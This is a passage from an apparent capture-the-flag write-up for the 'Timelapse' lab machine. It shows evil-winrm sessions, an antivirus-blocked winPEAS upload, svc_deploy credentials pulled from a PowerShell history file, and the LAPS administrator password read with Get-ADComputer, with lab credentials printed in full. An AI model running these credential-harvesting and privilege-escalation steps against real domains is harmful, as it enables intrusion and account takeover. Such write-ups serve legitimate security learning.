I then authenticated and logged in as the user `legacyy`!
Note: I also removed the PEM pass phrase because it was annoying with the command: `openssl rsa -in timelapse.key -out timelapse.key`.
```bash
➜  timelapse evil-winrm -i 10.10.11.152 -S -c openssl/timelapse.crt -k openssl/timelapse.key

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
Enter PEM pass phrase:
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```
When I attempted to run winPEAS, it was caught by antivirus.
```bash
*Evil-WinRM* PS C:\programdata> upload exes/winPEASany.exe
Info: Uploading exes/winPEASany.exe to C:\programdata\winPEASany.exe

                                                             
Data: 2582528 bytes of 2582528 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\programdata> ls


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2022   7:30 PM                Acronis
d---s-       10/23/2021  11:27 AM                Microsoft
d-----         3/3/2022  10:09 PM                Package Cache
d-----        5/22/2022  12:59 PM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----         3/3/2022  10:01 PM                ssh
d-----       10/23/2021  11:31 AM                USOPrivate
d-----       10/23/2021  11:31 AM                USOShared
d-----         3/3/2022  10:10 PM                VMware
-a----        5/22/2022   1:07 PM        1916715 winPEASany.exe


*Evil-WinRM* PS C:\programdata> .\winPEASany.exe
Program 'winPEASany.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\winPEASany.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\winPEASany.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\programdata>

```
When listing users I noticed that `svc_deploy` is the only other legitimate user on the box besides administrator.
```bash
*Evil-WinRM* PS C:\Users> net users                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
User accounts for \\                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----        5/22/2022   1:37 PM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy 
d-----        2/23/2022   5:45 PM                TRX
```
When listing details for the `svc_deploy` user I noticed that the user is a member of `LAPS_Readers` which would allow us to gain administrator access so my new goal became figuring out credentials for the user `svc_deploy`.
```bash
*Evil-WinRM* PS C:\Users> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/22/2022 3:44:26 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
After a bit of manual enumeration, I checked the powershell history file to find credentials for `svc_deploy`!
```bash
*Evil-WinRM* PS C:\Users\legacyy\appdata\Roaming\Microsoft\Windows\Powershell\PSReadLine> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
I then authenticated as `svc_deploy`.
```bash
➜  timelapse evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```
Then I ran a command to query the current administrator password.
```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter {ms-mcs-admpwd -like '*'} -Properties 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : [e7J6GEY2881Xe6BnPe+iSmE
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```
Resources used:
[Step-by-Step Guide: How to Configure Microsoft Local Administrator Password Solution (LAPS)](https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to-configure-microsoft-local/ba-p/2806185)
![[Attachments/Pasted image 20220522103313.png]]
[Microsoft LAPS Security & Active Directory LAPS Configuration Recon](https://adsecurity.org/?p=3164)
![[Attachments/Pasted image 20220522103334.png]]